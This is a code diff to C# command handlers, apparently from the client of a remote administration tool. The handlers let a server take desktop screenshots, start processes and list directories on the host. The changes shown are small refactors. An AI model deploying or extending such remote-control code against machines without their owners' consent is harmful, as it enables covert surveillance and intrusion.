@@ -30,6 +30,7 @@ namespace xClient.Core.Commands
 		private const int MOUSEEVENTF_LEFTUP = 0x04;
 		private const int MOUSEEVENTF_RIGHTDOWN = 0x08;
 		private const int MOUSEEVENTF_RIGHTUP = 0x10;
+		private const string DELIMITER = "$E$";
 
 		public static void HandleInitializeCommand(Packets.ServerPackets.InitializeCommand command, Client client)
 		{
@@ -221,7 +222,7 @@ namespace xClient.Core.Commands
 			}
 			else
 			{
-			    Bitmap currentDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number);
+				Bitmap currentDesktopScreenshot = Helper.Helper.GetDesktop(command.Mode, command.Number);
 				using (Bitmap changesScreenshot = Helper.Helper.GetDiffDesktop(LastDesktopScreenshot, currentDesktopScreenshot))
 				{
 					LastDesktopScreenshot = currentDesktopScreenshot;
@@ -266,9 +267,7 @@ namespace xClient.Core.Commands
 
 		public static void HandleStartProcess(Packets.ServerPackets.StartProcess command, Client client)
 		{
-			ProcessStartInfo startInfo = new ProcessStartInfo();
-			startInfo.UseShellExecute = true;
-			startInfo.FileName = command.Processname;
+			ProcessStartInfo startInfo = new ProcessStartInfo {UseShellExecute = true, FileName = command.Processname};
 			Process.Start(startInfo);
 
 			HandleGetProcesses(new Packets.ServerPackets.GetProcesses(), client);
@@ -301,7 +300,7 @@ namespace xClient.Core.Commands
 				}
 				if (files.Length == 0)
 				{
-					files = new string[] { "$$$EMPTY$$$$" };
+					files = new string[] { DELIMITER };
 					filessize = new long[] { 0 };
 				}
 
@@ -312,13 +311,13 @@ namespace xClient.Core.Commands
 					i++;
 				}
 				if (folders.Length == 0)
-					folders = new string[] { "$$$EMPTY$$$$" };
+					folders = new string[] { DELIMITER };
 
 				new Packets.ClientPackets.DirectoryResponse(files, folders, filessize).Execute(client);
 			}
 			catch
 			{
-				new Packets.ClientPackets.DirectoryResponse(new string[] { "$$$EMPTY$$$$" }, new string[] { "$$$EMPTY$$$$" }, new long[] { 0 }).Execute(client);
+				new Packets.ClientPackets.DirectoryResponse(new string[] { DELIMITER }, new string[] { DELIMITER }, new long[] { 0 }).Execute(client);
 			}
 		}
 
